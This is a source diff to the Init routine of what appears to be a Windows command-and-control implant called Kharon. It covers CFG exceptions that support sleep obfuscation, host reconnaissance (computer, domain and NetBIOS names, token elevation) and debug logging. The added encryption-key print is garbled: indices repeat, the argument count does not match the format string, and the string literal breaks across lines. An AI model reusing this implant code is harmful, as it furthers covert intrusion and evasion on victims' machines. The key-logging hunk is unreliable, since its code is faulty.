@@ -237,7 +237,7 @@ auto DECLFN Kharon::Init(
     KhDbgz( "Library msvcrt.dll    Loaded at %p and Functions Resolveds", this->Msvcrt.Handle    );
 
     /* ========= [ cfg exceptions to sleep obf ] ========= */
-    if ( this->Usf->CfgCheck() ) {
+    if ( this->Machine.CfgEnabled = this->Usf->CfgCheck() ) {
         this->Usf->CfgAddrAdd( (PVOID)this->Ntdll.Handle, (PVOID)this->Ntdll.NtSetContextThread );
         this->Usf->CfgAddrAdd( (PVOID)this->Ntdll.Handle, (PVOID)this->Ntdll.NtGetContextThread );
         this->Usf->CfgAddrAdd( (PVOID)this->Ntdll.Handle, (PVOID)this->Ntdll.NtWaitForSingleObject );
@@ -360,19 +360,19 @@ auto DECLFN Kharon::Init(
     this->Session.Elevated = Elevation.TokenIsElevated;
 
     Success = this->Krnl32.GetComputerNameExA( ComputerNameDnsHostname, NULL, &TmpVal );
-    if ( !Success ) {
+    if ( ! Success ) {
         this->Machine.CompName = (PCHAR)this->Hp->Alloc( TmpVal );
         this->Krnl32.GetComputerNameExA( ComputerNameDnsHostname, this->Machine.CompName, &TmpVal );
     }
 
     Success = this->Krnl32.GetComputerNameExA( ComputerNameDnsDomain, NULL, &TmpVal );
-    if ( !Success ) {
+    if ( ! Success ) {
         this->Machine.DomName = (PCHAR)this->Hp->Alloc( TmpVal );
         this->Krnl32.GetComputerNameExA( ComputerNameDnsDomain, this->Machine.DomName, &TmpVal );
     }
 
     Success = this->Krnl32.GetComputerNameExA( ComputerNameNetBIOS, NULL, &TmpVal );
-    if ( !Success ) {
+    if ( ! Success ) {
         this->Machine.NetBios = (PCHAR)this->Hp->Alloc( TmpVal );
         this->Krnl32.GetComputerNameExA( ComputerNameNetBIOS, A_PTR( this->Machine.NetBios ), &TmpVal );
     }
@@ -410,13 +410,14 @@ auto DECLFN Kharon::Init(
     KhDbgz( "Sleep Time: %d", this->Config.SleepTime );
     KhDbgz( "Jitter Time: %d\n", this->Config.Jitter );
 
-    // KhDbgz( "Encryption Key\n" );
-
-    // for ( INT i = 0; i < sizeof( this->Crp->LokKey ); i++ ) {
-    //     // this->Crp->LokKey[i] = (BYTE)Rnd32();
-    //     this->Msvcrt.printf("%X ", this->Crp->LokKey[i]);
-    // }
-    // this->Msvcrt.printf("\n");
+    KhDbgz( "Encryption Key[16] = 
+        [%X] [%X] [%X] [%X] [%X] [%X] [%X] [%X] [%X] [%X] [%X] [%X] [%X] [%X] [%X] [%X] \n", 
+        this->Crp->LokKey[0],  this->Crp->LokKey[1],  this->Crp->LokKey[2],  this->Crp->LokKey[0], 
+        this->Crp->LokKey[3],  this->Crp->LokKey[4],  this->Crp->LokKey[5],  this->Crp->LokKey[0], 
+        this->Crp->LokKey[6],  this->Crp->LokKey[7],  this->Crp->LokKey[8],  this->Crp->LokKey[0], 
+        this->Crp->LokKey[9],  this->Crp->LokKey[10], this->Crp->LokKey[11], this->Crp->LokKey[12], 
+        this->Crp->LokKey[13], this->Crp->LokKey[14], this->Crp->LokKey[14]
+    );
 
     KhDbgz( "======== Machine Informations ========" );
     KhDbgz( "User Name: %s", this->Machine.UserName );
